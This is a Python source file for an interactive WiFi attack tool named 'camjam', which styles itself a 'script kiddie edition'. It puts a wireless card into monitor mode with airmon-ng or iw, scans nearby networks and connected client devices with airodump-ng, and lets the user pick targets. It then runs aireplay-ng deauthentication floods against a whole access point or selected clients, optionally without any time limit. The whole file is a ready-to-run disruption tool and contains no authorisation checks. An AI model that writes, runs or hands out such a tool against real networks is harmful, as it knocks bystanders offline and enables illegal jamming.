#!/usr/bin/env python3

import csv
import glob
import os
import shutil
import random
import subprocess
import sys
import time
from typing import Dict, List, Tuple
from importlib import import_module
from threading import Thread, Event

# === Styling (skid vibes) ===
PALETTE = {
    "reset": "\033[0m",
    "accent": "\033[38;5;199m",
    "good": "\033[38;5;48m",
    "warn": "\033[38;5;214m",
    "bad": "\033[38;5;196m",
    "info": "\033[38;5;51m",
}

DEFAULT_BAND = "abg"
NETWORK_SCAN_DURATION = 20
CLIENT_SCAN_DURATION = 15
WRITE_INTERVAL = 1
DEAUTH_DEFAULT_SECONDS = 10
DEAUTH_PACKETS = 10
VALID_BANDS = {"a", "b", "g", "ab", "ag", "bg", "abg"}

REQUIRED_TOOLS = ["airodump-ng", "iw", "ip", "aireplay-ng"]
OPTIONAL_TOOLS = ["airmon-ng"]

try:
    text2art = import_module("art").text2art  # type: ignore[attr-defined]
except ModuleNotFoundError:
    text2art = None


def fx(label: str, msg: str, color: str = "info") -> None:
    """Print a colored status line."""
    print(f"{PALETTE[color]}[{label}] {msg}{PALETTE['reset']}")


def banner() -> None:
    if text2art:
        try:
            art_banner = text2art("camjam", font="epic")
        except Exception:
            art_banner = r""" CAMJAM
        """
    else:
        fx("warn", "art module missing; install with pip or run with your venv interpreter", "warn")
        art_banner = r""" CAMJAM
    """
    print(f"{PALETTE['accent']}{art_banner}{PALETTE['reset']}")
    fx("camjam", "wifi scanner // monitor mode // script kiddie edition", "accent")


def check_root_privileges() -> None:
    """Ensure the script is running as root."""
    if os.geteuid() != 0:
        fx("x", "root required. run with sudo python3 ./src/main.py", "bad")
        sys.exit(1)


def ensure_dependencies() -> None:
    """Ensure required binaries are available."""
    missing = [cmd for cmd in REQUIRED_TOOLS if shutil.which(cmd) is None]
    if missing:
        fx("x", f"missing tools: {', '.join(missing)} (install aircrack-ng/iw)", "bad")
        sys.exit(1)

    optional_missing = [cmd for cmd in OPTIONAL_TOOLS if shutil.which(cmd) is None]
    if optional_missing:
        fx("warn", f"{', '.join(optional_missing)} not found; will fall back to iw for monitor mode", "warn")


def list_wifi_interfaces() -> List[str]:
    """List available WiFi interfaces."""
    try:
        result = subprocess.run(
            ["ip", "-o", "link", "show"],
            capture_output=True,
            text=True,
            check=True,
        )
    except subprocess.CalledProcessError:
        fx("x", "could not list network interfaces", "bad")
        return []

    interfaces = []
    for line in result.stdout.splitlines():
        # Format: 2: wlp3s0: <BROADCAST,MULTICAST,UP,...>
        parts = line.split(":")
        if len(parts) < 2:
            continue
        iface = parts[1].strip().split("@")[0]
        if iface.startswith("w") and iface != "lo":
            interfaces.append(iface)
    return interfaces


def select_wifi_interface(interfaces: List[str]) -> str:
    """Allow user to select a WiFi interface."""
    if len(interfaces) == 1:
        fx("iface", f"using {interfaces[0]} (only option)", "accent")
        return interfaces[0]

    print()
    fx("ifaces", "pick your radio:", "accent")
    for idx, iface in enumerate(interfaces, 1):
        print(f"   {PALETTE['accent']}{idx}{PALETTE['reset']}: {iface}")

    while True:
        choice = input(f"{PALETTE['info']}[?] interface # > {PALETTE['reset']}")
        try:
            index = int(choice)
            if 1 <= index <= len(interfaces):
                return interfaces[index - 1]
            fx("!", "invalid choice", "warn")
        except ValueError:
            fx("!", "numbers only", "warn")


def stop_network_manager() -> None:
    """Stop services that block monitor mode."""
    subprocess.run(["systemctl", "stop", "NetworkManager"], check=False, capture_output=True)
    subprocess.run(["systemctl", "stop", "wpa_supplicant"], check=False, capture_output=True)
    subprocess.run(["rfkill", "unblock", "wifi"], check=False, capture_output=True)
    fx("-", "network manager stopped", "warn")


def restart_network_manager() -> None:
    """Restart services after scanning."""
    subprocess.run(["systemctl", "restart", "NetworkManager"], check=False, capture_output=True)
    subprocess.run(["systemctl", "start", "wpa_supplicant"], check=False, capture_output=True)
    fx("+", "network manager restarted", "good")


def check_interface_state(interface: str) -> str:
    """Check if interface is in monitor mode or managed mode."""
    try:
        result = subprocess.run(
            ["iw", "dev", interface, "info"], capture_output=True, text=True, check=True
        )
    except subprocess.CalledProcessError:
        return "unknown"

    if "type monitor" in result.stdout:
        return "monitor"
    if "type managed" in result.stdout:
        return "managed"
    return "unknown"


def kill_interfering_processes() -> None:
    """Kill processes that might prevent monitor mode."""
    try:
        subprocess.run(["airmon-ng", "check", "kill"], check=False, capture_output=True)
        fx("kill", "airmon-ng check kill executed", "warn")
    except FileNotFoundError:
        fx("skip", "airmon-ng not installed; skipping process kill", "warn")


def set_monitor_mode(interface: str) -> str:
    """Set the WiFi interface into monitor mode, returning the interface name."""
    kill_interfering_processes()
    stop_network_manager()

    current_state = check_interface_state(interface)
    fx("iface", f"{interface} state: {current_state}", "info")
    if current_state == "monitor":
        fx("ok", f"{interface} already in monitor mode", "good")
        return interface

    fx("airmon", "spinning up monitor mode...", "accent")
    try:
        subprocess.run(["airmon-ng", "start", interface], check=True, capture_output=True)
        monitor_interface = f"{interface}_mon"
        if os.path.exists(f"/sys/class/net/{monitor_interface}"):
            fx("ok", f"monitor interface: {monitor_interface}", "good")
            return monitor_interface
    except subprocess.CalledProcessError:
        fx("warn", "airmon-ng start failed, falling back to direct iw", "warn")

    return set_monitor_mode_direct(interface)


def set_monitor_mode_direct(interface: str) -> str:
    """Set monitor mode using direct iw commands."""
    monitor_interface = f"{interface}_mon"
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=True, capture_output=True)
        subprocess.run(
            ["iw", "dev", interface, "interface", "add", monitor_interface, "type", "monitor"],
            check=True,
            capture_output=True,
        )
        subprocess.run(["ip", "link", "set", monitor_interface, "up"], check=True, capture_output=True)
        fx("ok", f"monitor interface: {monitor_interface}", "good")
        return monitor_interface
    except subprocess.CalledProcessError as exc:
        fx("x", f"failed to set monitor mode: {exc}", "bad")
        return ""


def reset_interface(interface: str) -> None:
    """Reset interface to managed mode (best effort)."""
    try:
        subprocess.run(["ip", "link", "set", interface, "down"], check=True, capture_output=True)
        subprocess.run(["iw", "dev", interface, "set", "type", "managed"], check=True, capture_output=True)
        subprocess.run(["ip", "link", "set", interface, "up"], check=True, capture_output=True)
        fx("+", f"{interface} reset to managed mode", "good")
    except subprocess.CalledProcessError as exc:
        fx("warn", f"could not reset {interface}: {exc}", "warn")


def wait_for_csv(prefix: str, retries: int = 6, delay: float = 1.5) -> str:
    """Find the CSV that airodump-ng writes (it always appends -01)."""
    pattern = f"{prefix}*.csv"
    for _ in range(retries):
        matches = sorted(glob.glob(pattern))
        if matches:
            return matches[0]
        time.sleep(delay)
    return ""


def run_airodump_scan(
    name: str,
    interface: str,
    duration: int,
    *,
    channel: str | None = None,
    bssid: str | None = None,
    band: str | None = DEFAULT_BAND,
) -> Tuple[str, str]:
    """Kick off airodump-ng and return the csv path plus prefix for cleanup."""
    timestamp = int(time.time())
    prefix = f"/tmp/camjam_{name}_{timestamp}"
    cmd = [
        "airodump-ng",
        interface,
        "--output-format",
        "csv",
        "--write",
        prefix,
        "--write-interval",
        str(WRITE_INTERVAL),
    ]
    band_arg = DEFAULT_BAND if band is None else band.strip()
    if band_arg:
        cmd += ["--band", band_arg]
    if channel:
        cmd += ["--channel", str(channel)]
    if bssid:
        cmd += ["--bssid", bssid]

    fx("scan", f"{' '.join(cmd)}", "accent")
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(duration)
    proc.terminate()
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait()

    csv_path = wait_for_csv(prefix)
    if not csv_path:
        fx("x", "airodump did not output CSV. check interface/driver.", "bad")
    else:
        fx("ok", f"captured -> {csv_path}", "good")
    return csv_path, prefix


def cleanup_scan_files(prefix: str) -> None:
    """Remove airodump artifacts for a given prefix."""
    for file_path in glob.glob(f"{prefix}*"):
        try:
            os.remove(file_path)
        except OSError:
            pass


def parse_airodump_csv(csv_path: str) -> Tuple[List[Dict[str, str]], List[Dict[str, str]]]:
    """Parse airodump CSV into networks and client devices."""
    networks: List[Dict[str, str]] = []
    clients: List[Dict[str, str]] = []
    section = "networks"

    try:
        with open(csv_path, newline="") as csvfile:
            reader = csv.reader(csvfile)
            for row in reader:
                if not row or all(not cell.strip() for cell in row):
                    continue

                first = row[0].strip()
                if first.startswith("BSSID"):
                    section = "networks"
                    continue
                if first.startswith("Station MAC"):
                    section = "clients"
                    continue

                if section == "networks":
                    if len(row) >= 14:
                        networks.append(
                            {
                                "bssid": row[0].strip(),
                                "first_seen": row[1].strip(),
                                "last_seen": row[2].strip(),
                                "channel": row[3].strip(),
                                "speed": row[4].strip(),
                                "encryption": row[5].strip(),
                                "cipher": row[6].strip(),
                                "auth": row[7].strip(),
                                "power": row[8].strip(),
                                "beacons": row[9].strip(),
                                "iv": row[10].strip(),
                                "lan_ip": row[11].strip(),
                                "essid_len": row[12].strip(),
                                "ssid": row[13].strip(),
                                "key": row[14].strip() if len(row) > 14 else "",
                            }
                        )
                elif section == "clients":
                    if len(row) >= 6:
                        clients.append(
                            {
                                "station_mac": row[0].strip(),
                                "power": row[3].strip(),
                                "packets": row[4].strip(),
                                "bssid": row[5].strip(),
                                "probes": row[6].strip() if len(row) > 6 else "",
                            }
                        )
    except FileNotFoundError:
        fx("x", f"csv not found: {csv_path}", "bad")

    # Filter obvious noise but keep hidden SSIDs (mark them)
    cleaned: List[Dict[str, str]] = []
    for net in networks:
        if not net.get("bssid"):
            continue
        if net.get("ssid") in ("", "(not associated)"):
            net["ssid"] = "<hidden>"
        cleaned.append(net)
    networks = cleaned
    return networks, clients


def sort_by_power(entries: List[Dict[str, str]], key: str = "power") -> List[Dict[str, str]]:
    """Sort entries descending by power value (default -1000 if missing)."""
    def power_val(entry: Dict[str, str]) -> int:
        try:
            return int(entry.get(key, "-1000"))
        except ValueError:
            return -1000
    return sorted(entries, key=power_val, reverse=True)


def display_networks(networks: List[Dict[str, str]]) -> None:
    """Pretty print available networks."""
    if not networks:
        fx("none", "no networks seen. try a longer scan.", "warn")
        return

    print()
    fx("loot", "beacons spotted:", "accent")
    print(f"{PALETTE['accent']}{'-'*80}{PALETTE['reset']}")
    print(f"{'ID':<4} {'CH':<4} {'PWR':<5} {'ENC':<8} {'BSSID':<18} SSID")
    print(f"{PALETTE['accent']}{'-'*80}{PALETTE['reset']}")
    for idx, net in enumerate(networks, 1):
        line = (
            f"{idx:<4} "
            f"{net['channel']:<4} "
            f"{net['power']:<5} "
            f"{net['encryption']:<8} "
            f"{net['bssid']:<18} "
            f"{net['ssid']}"
        )
        print(line)


def select_network(networks: List[Dict[str, str]]) -> Dict[str, str] | None:
    """Allow user to select a network to target."""
    if not networks:
        return None
    display_networks(networks)

    while True:
        choice = input(f"{PALETTE['info']}[?] pick target # > {PALETTE['reset']}")
        try:
            index = int(choice)
            if 1 <= index <= len(networks):
                return networks[index - 1]
            fx("!", "invalid choice", "warn")
        except ValueError:
            fx("!", "numbers only", "warn")


def display_clients(clients: List[Dict[str, str]]) -> None:
    """Print connected devices list."""
    if not clients:
        fx("clients", "no stations seen in this window", "warn")
        return

    print()
    fx("clients", "connected devices:", "accent")
    print(f"{PALETTE['accent']}{'-'*72}{PALETTE['reset']}")
    print(f"{'MAC':<18} {'PWR':<5} {'PKTS':<6} {'BSSID':<18} PROBES")
    print(f"{PALETTE['accent']}{'-'*72}{PALETTE['reset']}")
    for client in clients:
        probes = client['probes'][:30] + ("..." if len(client['probes']) > 30 else "")
        print(
            f"{client['station_mac']:<18} "
            f"{client['power']:<5} "
            f"{client['packets']:<6} "
            f"{client['bssid']:<18} "
            f"{probes}"
        )


def display_target_info(target: Dict[str, str], clients: List[Dict[str, str]]) -> None:
    """Show selected target details and any cached clients."""
    print()
    fx("target", "current selection:", "accent")
    print(f"BSSID : {target.get('bssid')}")
    print(f"SSID  : {target.get('ssid')}")
    print(f"CH    : {target.get('channel')}")
    print(f"ENC   : {target.get('encryption')} {target.get('auth')} {target.get('cipher')}")
    print(f"POWER : {target.get('power')}")
    fx("clients", f"cached clients: {len(clients)}", "info")
    if clients:
        display_clients(clients)


def select_clients(clients: List[Dict[str, str]]) -> List[str]:
    """Let user pick one or more clients (comma-separated indices) or all."""
    if not clients:
        fx("warn", "no clients cached; run a client scan first", "warn")
        return []

    display_clients(clients)
    prompt = f"{PALETTE['info']}[?] select clients (#,# or 'all', ENTER to cancel) > {PALETTE['reset']}"
    choice = input(prompt).strip().lower()
    if not choice:
        return []
    if choice == "all":
        return [c["station_mac"] for c in clients if c.get("station_mac")]

    selected: List[str] = []
    for part in choice.split(","):
        part = part.strip()
        if not part:
            continue
        try:
            idx = int(part)
            if 1 <= idx <= len(clients):
                mac = clients[idx - 1].get("station_mac")
                if mac:
                    selected.append(mac)
            else:
                fx("warn", f"client #{idx} out of range", "warn")
        except ValueError:
            fx("warn", f"invalid selection: {part}", "warn")
    return selected


def prompt_band(current: str) -> str:
    """Ask user for band selection."""
    prompt = f"{PALETTE['info']}[?] band (a/b/g/ab/ag/bg/abg) [current {current}] > {PALETTE['reset']}"
    entry = input(prompt).strip().lower()
    if not entry:
        return current
    if entry in VALID_BANDS:
        return entry
    fx("warn", "invalid band; keeping current", "warn")
    return current


def prompt_deauth_duration() -> int:
    """Ask user for deauth duration; default 10s, 0 for unlimited."""
    prompt = f"{PALETTE['info']}[?] deauth duration seconds (ENTER for {DEAUTH_DEFAULT_SECONDS}, 0 = unlimited) > {PALETTE['reset']}"
    entry = input(prompt).strip()
    if not entry:
        return DEAUTH_DEFAULT_SECONDS
    try:
        seconds = int(entry)
        if seconds < 0:
            return 0
        return seconds
    except ValueError:
        fx("warn", "invalid duration, using default", "warn")
        return DEAUTH_DEFAULT_SECONDS


def start_monitor_process(
    interface: str, bssid: str, channel: str | None
) -> tuple[subprocess.Popen | None, List[str]]:
    """Spawn airodump to watch deauth impact; prefer xterm if present."""
    if not bssid or not channel:
        fx("warn", "missing bssid/channel; skipping monitor window", "warn")
        return None, []

    cmd = ["airodump-ng", "--bssid", bssid, "--channel", str(channel), interface]
    term = shutil.which("xterm")
    try:
        if term:
            proc = subprocess.Popen([term, "-T", f"airodump {bssid}", "-e"] + cmd)
            fx("monitor", f"opened monitor window: {' '.join(cmd)}", "info")
            return proc, cmd
        # Fallback: run inline in background and stream output (threaded)
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        stop_event = Event()

        def _stream_output() -> None:
            assert proc.stdout is not None
            for line in proc.stdout:
                if stop_event.is_set():
                    break
                print(f"{PALETTE['accent']}{line.rstrip()}{PALETTE['reset']}")

        Thread(target=_stream_output, daemon=True).start()
        proc.stop_event = stop_event  # type: ignore[attr-defined]
        fx("monitor", f"inline monitor started: {' '.join(cmd)}", "info")
        return proc, cmd
    except Exception as exc:
        fx("warn", f"could not start monitor: {exc}", "warn")
        return None, cmd


def stop_monitor_process(proc: subprocess.Popen | None) -> None:
    """Terminate any running monitor process."""
    if not proc:
        return
    try:
        stop_event = getattr(proc, "stop_event", None)
        if stop_event:
            stop_event.set()
        proc.terminate()
        proc.wait(timeout=3)
    except Exception:
        proc.kill()


def run_deauth(
    iface: str,
    bssid: str,
    clients: List[str] | None = None,
    packets: int = DEAUTH_PACKETS,
    duration: int = DEAUTH_DEFAULT_SECONDS,
    channel: str | None = None,
) -> None:
    """Execute aireplay-ng deauth against AP or specific clients."""
    if not bssid:
        fx("x", "no BSSID provided for deauth", "bad")
        return

    monitor_proc, monitor_cmd = start_monitor_process(iface, bssid, channel)

    targets = clients or []
    start_time = time.time()
    unlimited = duration <= 0

    try:
        while True:
            if not targets:
                cmd = ["aireplay-ng", "--deauth", str(packets), "-a", bssid, iface]
                fx("deauth", " ".join(cmd), "warn")
                subprocess.run(cmd, check=False)
            else:
                for mac in targets:
                    cmd = ["aireplay-ng", "--deauth", str(packets), "-a", bssid, "-c", mac, iface]
                    fx("deauth", " ".join(cmd), "warn")
                    subprocess.run(cmd, check=False)
            if not unlimited and (time.time() - start_time) >= duration:
                break
            time.sleep(random.randint(5, 10))
    except KeyboardInterrupt:
        fx("warn", "deauth interrupted by user; stopping", "warn")
    finally:
        stop_monitor_process(monitor_proc)


def scan_networks(interface: str, duration: int = NETWORK_SCAN_DURATION, band: str = DEFAULT_BAND) -> List[Dict[str, str]]:
    """Run airodump-ng for networks only and parse results."""
    csv_path, prefix = run_airodump_scan("nets", interface, duration, band=band)
    if not csv_path:
        return []

    networks, _ = parse_airodump_csv(csv_path)
    networks = sort_by_power(networks)
    cleanup_scan_files(prefix)
    fx("scan", f"found {len(networks)} networks", "good" if networks else "warn")
    return networks


def scan_clients(interface: str, target: Dict[str, str], duration: int = CLIENT_SCAN_DURATION) -> List[Dict[str, str]]:
    """Lock onto a BSSID/channel to grab client devices."""
    csv_path, prefix = run_airodump_scan(
        "clients",
        interface,
        duration,
        channel=target.get("channel"),
        bssid=target.get("bssid"),
        band=None,
    )
    if not csv_path:
        return []

    _, clients = parse_airodump_csv(csv_path)
    clients = sort_by_power(clients)
    cleanup_scan_files(prefix)
    return clients


def interactive_session(monitor_iface: str) -> None:
    """Interactive loop for selecting targets and running actions."""
    band = DEFAULT_BAND
    networks = scan_networks(monitor_iface, NETWORK_SCAN_DURATION, band=band)
    if not networks:
        return

    target = select_network(networks)
    if not target:
        fx("x", "no target chosen, exiting", "warn")
        return

    clients: List[Dict[str, str]] = []
    while True:
        print()
        fx("menu", f"1) target info  2) rescan/select  3) scan clients  4) deauth AP  5) deauth clients  6) set band [{band}]  0) quit", "accent")
        choice = input(f"{PALETTE['info']}[?] choice > {PALETTE['reset']}").strip()

        if choice == "1":
            display_target_info(target, clients)
        elif choice == "2":
            networks = scan_networks(monitor_iface, NETWORK_SCAN_DURATION, band=band)
            if not networks:
                continue
            new_target = select_network(networks)
            if new_target:
                target = new_target
                clients = []
        elif choice == "3":
            clients = scan_clients(monitor_iface, target, CLIENT_SCAN_DURATION)
            display_clients(clients)
        elif choice == "4":
            duration = prompt_deauth_duration()
            fx("target", f"deauth AP {target.get('ssid')} [{target.get('bssid')}]", "warn")
            run_deauth(
                monitor_iface,
                target.get("bssid", ""),
                duration=duration,
                channel=target.get("channel"),
            )
        elif choice == "5":
            if not clients:
                fx("warn", "no clients cached; run option 3 first", "warn")
                continue
            selected = select_clients(clients)
            if selected:
                duration = prompt_deauth_duration()
                fx("target", f"deauth {len(selected)} client(s) on {target.get('bssid')}", "warn")
                run_deauth(
                    monitor_iface,
                    target.get("bssid", ""),
                    clients=selected,
                    duration=duration,
                    channel=target.get("channel"),
                )
        elif choice == "6":
            band = prompt_band(band)
            fx("info", f"band set to {band}", "info")
        elif choice in ("0", "q", "quit", "exit"):
            break
        else:
            fx("!", "invalid choice", "warn")


def main() -> None:
    check_root_privileges()
    ensure_dependencies()
    banner()

    interfaces = list_wifi_interfaces()
    if not interfaces:
        fx("x", "no wireless interfaces found", "bad")
        return

    interface = select_wifi_interface(interfaces)
    fx("iface", f"selected {interface}", "accent")

    monitor_iface = set_monitor_mode(interface)
    if not monitor_iface:
        fx("x", "failed to enter monitor mode. try manual airmon.", "bad")
        return

    try:
        interactive_session(monitor_iface)
    finally:
        restart_network_manager()
        # Optionally reset the original interface if we created a _mon sibling
        if monitor_iface.endswith("_mon") and interface != monitor_iface:
            reset_interface(interface)


if __name__ == "__main__":
    main()
